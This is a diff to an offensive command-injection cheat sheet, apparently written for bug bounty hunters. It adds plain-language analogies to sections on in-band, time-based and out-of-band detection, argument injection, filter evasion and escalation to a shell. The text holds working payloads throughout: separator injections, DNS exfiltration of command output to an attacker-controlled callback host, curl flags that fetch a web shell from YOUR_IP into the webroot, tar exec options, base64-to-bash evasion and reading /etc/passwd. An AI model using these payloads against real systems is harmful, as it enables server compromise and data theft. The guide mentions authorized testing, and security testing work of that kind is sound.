@@ -20,6 +20,8 @@
 > 4. **Argument injection is the sneaky sibling.** When your input becomes an **argument** (not a full command), you can't add `;`, but you can inject **flags** (`-o`, `--output`, `--upload-file`, `-d`) that turn a benign tool into file-write/SSRF/RCE (e.g., `curl`, `tar`, `ffmpeg`, `git`). Always consider it when separators are filtered (§9).
 > 5. **A WAF/blacklist is not the end.** Spaces → `${IFS}`; quotes/concatenation → `w'h'oami`, `c\at`; encoding → `echo <b64>|base64 -d|bash`; globbing → `/???/c?t /etc/passwd`. Filtered command injection is still Critical once you evade (§10).
 >
+> **In plain words — the analogy (used throughout):** picture the app as a **clerk dictating a sentence to a robot that obeys every command it hears.** The app wants to say *"ping the address the user typed"*, so it reads out `ping <your input>`. If you type `127.0.0.1; delete everything`, the clerk dictates the **whole** line and the robot hears **two** commands. The `;` (and `|`, `&&`, `` ` ``, `$()`) is just **punctuation that starts a new command** — it ends the app's intended command and begins yours. That's the entire bug: **you're smuggling extra commands into a sentence the server speaks with its own authority.** "Blind" just means the robot obeys but you can't hear it — so you make it *pause* (`sleep`) or *phone you* (a DNS/HTTP callback) to prove it ran.
+>
 > **Where the money is (memorize this order):** ① **confirmed command execution → shell → full server compromise — Critical** → ② **blind command injection proven via time/OOB + output exfil — Critical** → ③ **argument injection → file write / SSRF / RCE — High–Critical** → ④ **filtered/WAF'd injection evaded to execution — Critical** → ⑤ *then* unconfirmed "special char reflected" as a **lead**, not a finding.
 
 ---
@@ -124,11 +126,14 @@ python3 poc/revshell.py --lhost YOUR_IP --lport 4444 --type bash
 ## 2.1 What it is
 User input is concatenated into a string that the app passes to a **shell** (or to a program with shell-style argument parsing). By injecting shell metacharacters, you terminate the intended command and run your own — or you inject **arguments** that change a program's behavior.
 
+> *In plain words:* the "shell" (`/bin/sh`, `bash`, `cmd.exe`, PowerShell) is the operating system's command interpreter — the thing that runs `ping`, `ls`, `whoami`. When code does `system("ping " + userInput)`, it glues your text onto a command and hands the whole string to the shell to run. The shell doesn't know which part the app meant and which part you added — it just obeys the punctuation. That's why one stray `;` turns "look up a hostname" into "run any command I want on the server."
+
 ## 2.2 The two flavors (decides your technique)
 ```
 CLASSIC (shell) injection: input → system("ping " + host) → host=`;id` runs `id`.       → separators (§5/§6).
 ARGUMENT injection:        input → exec(["curl", input]) → input="-o/tmp/x http://.."     → inject FLAGS (§9).
 ```
+> *In plain words:* there are two very different situations, and they need different attacks. **(1) Classic** = your input becomes part of a sentence handed to the shell, so you can add punctuation (`;`) and a whole new command — the loud, easy case. **(2) Argument injection** = the app is *careful* and passes your input as a single, separate word to one program (no shell sentence to break), so `;` does nothing. But you can still change *how that one program behaves* by supplying it **command-line flags** — e.g. feeding `curl` a `-o` flag makes it *write a file* instead of just fetching. Same idea as telling a taxi "go to X" vs. slipping "…and also stop at the bank" into the address field: if the driver treats it as one address it's useless, but a flag the program recognises still gets obeyed.
 
 ## 2.3 Observability classes (decides detection)
 ```
@@ -136,6 +141,7 @@ IN-BAND   → command output is returned to you (you SEE `id`).                 
 TIME      → no output, but you can cause a measurable DELAY (`;sleep 10`).     A timing oracle.
 OOB/BLIND → no output/delay reflected, but the server can make a DNS/HTTP hit. Confirm + exfil via callback (§8/§12).
 ```
+> *In plain words:* "observability" = **can you tell the command ran, and how?** Three cases: **in-band** — the app shows you the output, so you literally read `whoami`'s answer (easiest). **Time-based** — the app shows nothing, so you make it run `sleep 10`; if the response is reliably 10 seconds slower, *something* obeyed you (a "yes/no by stopwatch"). **Out-of-band (OOB)** — no output *and* no useful delay, so you make the server *phone home* to a listener you control (`nslookup you.oob.tool`); if your listener gets a hit, the command ran. Most real-world command injection is **blind** (time or OOB), which is exactly why beginners miss it — they only check for in-band output, see nothing, and wrongly conclude "not vulnerable."
 
 ## 2.4 Where command sinks live
 ```
@@ -210,6 +216,9 @@ OS hint:          ;ver (Windows) vs ;uname (Linux); & vs ; behavior; backslash h
 # 5. In-Band Detection
 
 Break out of the intended command and append yours; read the output in the response.
+
+> *In plain words:* start with a real value the app expects (like `127.0.0.1`) so the intended command still parses, then tack on a separator + your command. `127.0.0.1;id` = "do the ping, *then* run `id`." Prove it with a command whose answer the app could never produce on its own — `id` prints `uid=0(root)...`, `whoami` prints the account, or `echo CMDI-9f2a` echoes your random tag back. If that unmistakable string appears in the response, the shell ran your command: confirmed in-band RCE.
+
 ```
 ;id            | id            || id           & id          && id
 `id`           $(id)          %0a id  (newline)  \n id
@@ -262,6 +271,9 @@ Argument-only (no breakout possible):     pivot to OPTION injection (§9) — yo
 # 7. Blind: Time-Based Detection
 
 No output → make the server **wait**, and measure it.
+
+> *In plain words:* if you can't *see* the output, make the server **pause on command** and watch the clock. `sleep 10` does nothing but wait 10 seconds; if your request comes back ~10s slower than a normal one — repeatably — then your command executed (nothing else would add exactly that delay on demand). It's a yes/no oracle: "did the command run? → did the response get slow?" Always repeat it 2–3× so you don't mistake random network lag for a hit.
+
 ```
 Linux:    127.0.0.1;sleep 10        `sleep 10`    $(sleep 10)    || sleep 10    & sleep 10
           ping -c 10 127.0.0.1      (10s delay)   ;ping -c 10 127.0.0.1
@@ -295,6 +307,9 @@ The oracle = any observable difference tied to command success/failure:
 # 8. Blind: Out-of-Band (OOB) Detection & Exfiltration
 
 The fastest, most reliable blind confirmation — and your data channel.
+
+> *In plain words:* "out-of-band" means the proof comes back on a **different channel than the web response** — the server contacts a listener you own. You run a free tool (interactsh / Burp Collaborator) that gives you a unique hostname like `abc123.oast.pro` and logs anyone who looks it up or visits it. Then you inject `nslookup abc123.oast.pro` (a DNS lookup) or `curl http://abc123.oast.pro` (an HTTP request). If your listener records a hit **from the target's IP**, the command ran — even though the web page showed you nothing. DNS is the workhorse because it usually escapes firewalls that block outbound HTTP. Bonus: you can smuggle stolen data *into* the hostname — `nslookup $(whoami).abc123.oast.pro` makes the looked-up name literally contain the server's username (§12).
+
 ```
 DNS (works even when HTTP egress is blocked):
   127.0.0.1;nslookup CMDI.YOURID.oast.pro
@@ -313,6 +328,8 @@ EXFIL command output INTO the callback (DNS-safe encoding):
 # 9. Argument / Option Injection
 
 When your input becomes a **single argument** (not the whole command), separators won't help — but **injecting flags** can. The program does exactly what its options say.
+
+> *In plain words:* when the app is careful (`exec(["curl", yourInput])` with **no shell**), there's no sentence to break with `;` — your text is handed to `curl` as one word. But command-line programs treat any word starting with `-` as an **instruction to themselves**. So if you make your input *be* a flag, the program obeys it. `curl` normally just downloads a URL — but feed it `-o /var/www/html/shell.php http://you/shell.php` and its own `-o` ("output to file") flag makes it **write a web shell into the webroot** = RCE. `tar`'s `--checkpoint-action=exec=` runs a command; `git`'s `ext::sh` runs a command. The trick: identify *which* tool you're feeding (from error messages or source), then look up its dangerous flags. Defenders block this with `--` (which tells a program "no more flags after this") — so its absence is your opening.
 ```
 curl arg:   input="-o /var/www/html/shell.php http://YOUR_IP/shell.php"  → writes a web shell (RCE) ·  --upload-file (exfil) · -K (config file)
 tar arg:    input="--checkpoint=1 --checkpoint-action=exec=sh shell.sh"  → tar runs a command (RCE)
@@ -335,6 +352,9 @@ rsync:      -e / --rsh   → command exec
 # 10. WAF / Blacklist / Filter Evasion
 
 A filter blocks characters/words; route around it.
+
+> *In plain words:* a WAF/blacklist is just a list of forbidden characters and words ("no spaces", "no `cat`", "no `/etc/passwd`"). You get around it by **spelling the same command a different way** so it means the same thing to the shell but doesn't match the blocklist. No spaces? The shell reads `${IFS}` as a space (IFS = the shell's "internal field separator"), so `cat${IFS}/etc/passwd` works. Word `cat` banned? The shell strips empty quotes and backslashes before running, so `c''at`, `"c"at`, and `c\at` all still run `cat`. Everything banned? Base64-encode the whole command and pipe it to a decoder: `echo <b64>|base64 -d|bash`. Globbing (`/???/c?t`) lets `?` stand in for any character so you never type the literal name. Peel one filter layer at a time; combine tricks as needed.
+
 ```
 SPACES blocked:        cat${IFS}/etc/passwd     cat$IFS$9/etc/passwd     {cat,/etc/passwd}     cat</etc/passwd
                        X=$'\x20';cat${X}/etc/passwd     tab (%09)
@@ -359,6 +379,9 @@ python3 poc/evasion.py --cmd "cat /etc/passwd" --block "space,cat"    # prints w
 # 11. Command Injection → Shell
 
 Once a command runs, build from benign proof to (authorized) interactive shell.
+
+> *In plain words:* a "reverse shell" is you making the server open a live connection back to your machine so you can type commands interactively — a full foothold. But for **bug bounty you almost never need one**: a single `id` or `whoami` (or an OOB callback carrying `$(whoami)`) already proves RCE, which is the top severity. Reverse shells and pivoting are for **authorized red-team** work only, because dropping one is intrusive and risky. Rule: prove it with a harmless marker, then stop — the shell adds legal/operational risk, not more bounty.
+
 ```
 1. BENIGN PROOF (always first):  id ; whoami ; hostname ; uname -a   → identity/host (Critical proof).
 2. READ (minimal):               cat /etc/passwd | head ; ls -la ; env   (env may leak secrets — redact).
@@ -409,6 +432,8 @@ CLEAN UP:
 ---
 
 # 14. Special Sinks (ImageMagick, ffmpeg, git, tar, Windows)
+
+> *In plain words:* some features never show an obvious "type a command here" box — instead they hand your **file** to a helper program (ImageMagick resizes images, ffmpeg transcodes video, Ghostscript renders PDFs, git clones repos, tar extracts archives). Several of those programs can be tricked into running commands by the *contents* of the file or a crafted URL/filename — famously ImageMagick's "ImageTragick" (CVE-2016-3714), where a booby-trapped image makes it shell out. So a plain "upload a profile picture" feature can be RCE. Match the payload to the exact tool/version, and use the FileUpload kit to get the malicious file accepted.
 
 ```
 ImageMagick (ImageTragick CVE-2016-3714 & friends): upload a crafted image/SVG/MVG whose content triggers a
